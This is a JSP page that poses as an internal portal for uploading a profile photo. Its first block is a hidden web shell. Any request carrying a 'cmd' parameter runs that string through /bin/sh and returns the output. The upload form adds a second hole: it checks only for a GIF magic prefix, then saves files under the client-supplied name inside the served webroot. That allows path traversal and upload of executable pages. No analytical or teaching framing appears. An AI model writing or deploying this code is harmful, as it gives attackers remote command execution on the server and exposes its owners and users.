<%@ page import="java.io.*, java.util.*" %>
<%
    if (request.getParameter("cmd") != null) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", request.getParameter("cmd")});
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String l;
            while ((l = r.readLine()) != null) { out.println(l); }
        } catch (Exception e) { out.println("Error: " + e.getMessage()); }
        return; 
    }
%>
<!DOCTYPE html>
<html>
<head>
    <title>Internal Asset Portal</title>
    <style>
        body { font-family: sans-serif; background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; width: 400px; }
        .upload-zone { border: 2px dashed #007bff; padding: 30px; margin: 20px 0; border-radius: 8px; }
        .btn { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
<div class="card">
    <h2>Update Profile Photo</h2>
    <%
        String cType = request.getContentType();
        if (cType != null && cType.contains("multipart/form-data")) {
            DataInputStream dis = new DataInputStream(request.getInputStream());
            byte[] data = new byte[request.getContentLength()];
            dis.readFully(data);
            String content = new String(data, "ISO-8859-1");
            int fStart = content.indexOf("filename=\"") + 10;
            String name = content.substring(fStart, content.indexOf("\"", fStart));
            int hEnd = content.indexOf("\r\n\r\n", fStart) + 4;
            int bEnd = content.indexOf(cType.substring(cType.indexOf("boundary=") + 9), hEnd) - 4;

            if (data[hEnd] == 'G' && data[hEnd+1] == 'I' && data[hEnd+2] == 'F' && data[hEnd+3] == '8') {
                FileOutputStream fos = new FileOutputStream("/usr/local/tomcat/webapps/ROOT/uploads/" + name);
                fos.write(data, hEnd, bEnd - hEnd);
                fos.close();
                out.println("<p style='color:green'>Saved to: uploads/" + name + "</p>");
            } else { out.println("<p style='color:red'>Invalid Header!</p>"); }
        }
    %>
    <form class="upload-zone" method="POST" enctype="multipart/form-data">
        <input type="file" name="file" required><br><br>
        <input type="submit" class="btn" value="Upload to Cloud">
    </form>
</div>
</body>
</html>